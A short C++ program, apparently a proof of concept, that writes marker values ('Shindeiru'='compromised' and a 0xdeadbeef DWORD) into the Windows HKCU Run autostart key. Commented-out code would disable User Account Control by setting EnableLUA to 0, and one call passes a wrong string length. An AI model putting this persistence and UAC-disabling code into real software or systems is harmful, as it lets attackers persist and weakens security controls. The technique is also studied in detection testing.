#include <iostream>
#include <Windows.h>

int main() {
	HKEY hKey;
	HKEY disableUAC;
	RegCreateKeyExA(HKEY_CURRENT_USER,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS | KEY_WOW64_64KEY,
		NULL,
		&hKey,
		NULL
	);
	/*
	RegCreateKeyExA(HKEY_CURRENT_USER,
		"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies",
		0,
		NULL,
		REG_OPTION_NON_VOLATILE,
		KEY_ALL_ACCESS | KEY_WOW64_64KEY,
		NULL,
		&disableUAC,
		NULL
	);
	*/
	DWORD val = 0xdeadbeef;
	//DWORD none = 0;
	RegSetKeyValueA(hKey, "Run", "Shindeiru", REG_SZ, "compromised", 64);
	RegSetKeyValueA(hKey, "Run", "validation", REG_DWORD, &val, sizeof(val));
	//RegSetKeyValueA(disableUAC, "System", "EnableLUA", REG_DWORD, &none, sizeof(none));
}